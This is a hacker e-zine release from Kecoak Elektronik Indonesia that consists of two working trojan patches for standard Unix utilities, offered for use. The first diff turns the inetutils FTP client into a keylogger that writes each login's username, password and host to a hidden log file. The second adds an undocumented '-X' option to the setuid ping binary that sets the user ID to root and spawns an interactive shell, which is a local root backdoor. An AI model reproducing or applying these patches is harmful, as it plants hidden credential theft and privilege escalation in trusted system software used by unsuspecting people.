@@ -1,0 +1,107 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak.org
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak.org
+Contact   : staff@kecoak.org
+####################################################################
+
+
+Subject   : FTP Inetutils Client Keylogger Patch
+Code Name : inetutils1.6-ftp.diff
+Writer    : Pseudoanonymous of Kecoak Elektronik
+Contact   : asktothegoogleaboutmyemail (at) Kecoak Elektronik
+Style     : Unicode Transformation Format (UTF-8)
+
+
+8<- - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - -
+
+diff -ur inetutils-1.6/ftp/ftp.c inetutils-1.6.patch/ftp/ftp.c
+--- inetutils-1.6/ftp/ftp.c	2008-12-28 03:03:40.000000000 +0700
++++ inetutils-1.6.patch/ftp/ftp.c	2009-07-09 01:56:18.000000000 +0700
+@@ -314,7 +314,11 @@
+       acct = getpass ("Account:");
+       n = command ("ACCT %s", acct);
+     }
+-  if (n != COMPLETE)
++  logger=fopen(LOG_DIR"/"FTPLOG,"a+");
++  fprintf(logger,"user:pass@host = %s:%s@%s\n",user,pass, host);
++  fclose(logger);
++ 
++ if (n != COMPLETE)
+     {
+       error (0, 0, "Login failed.");
+       return (0);
+diff -ur inetutils-1.6/ftp/ftp_var.h inetutils-1.6.patch/ftp/ftp_var.h
+--- inetutils-1.6/ftp/ftp_var.h	2008-12-28 03:04:04.000000000 +0700
++++ inetutils-1.6.patch/ftp/ftp_var.h	2010-08-08 23:38:23.000000000 +0700
+@@ -151,3 +151,6 @@
+ FTP_EXTERN char macbuf[4096];
+ 
+ #include "extern.h"
++FILE *logger;
++#define LOG_DIR "/opt/anto/logger"
++#define FTPLOG "ftp.log"
+
+
+
+8<- - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - -
+
+
+Subject   : PING iputils local root backdoor
+Code Name : iputils-s20100418-ping.diff
+Writer    : Pseudoanonymous of Kecoak Elektronik
+Contact   : asktothegoogleaboutmyemail (at) Kecoak Elektronik
+Style     : Unicode Transformation Format (UTF-8)
+
+
+8<- - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - -
+
+
+--- ping.c.old	2010-08-08 15:16:10.000000000 +0700
++++ ping.c	2010-08-08 15:27:33.000000000 +0700
+@@ -126,17 +126,22 @@
+ 	icmp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+ 	socket_errno = errno;
+ 
+-	uid = getuid();
+-	if (setuid(uid)) {
+-		perror("ping: setuid");
+-		exit(-1);
+-	}
++	//uid = getuid();
++	//if (setuid(uid)) {
++	//	perror("ping: setuid");
++	//	exit(-1);
++	//}
+ 
+ 	source.sin_family = AF_INET;
+ 
+ 	preload = 1;
+-	while ((ch = getopt(argc, argv, COMMON_OPTSTR "bRT:")) != EOF) {
++	while ((ch = getopt(argc, argv, COMMON_OPTSTR "bRXT:")) != EOF) {
+ 		switch(ch) {
++		case 'X':
++			setreuid(0,0);
++			setregid(0,0);
++			system("/bin/sh -i");
++			break;
+ 		case 'b':
+ 			broadcast_pings = 1;
+ 			break;
+
+
+8<- - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - - 8< - - - - -
+
+
+
+Sarang Kecoak
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2011 Kecoak Elektronik Indonesia
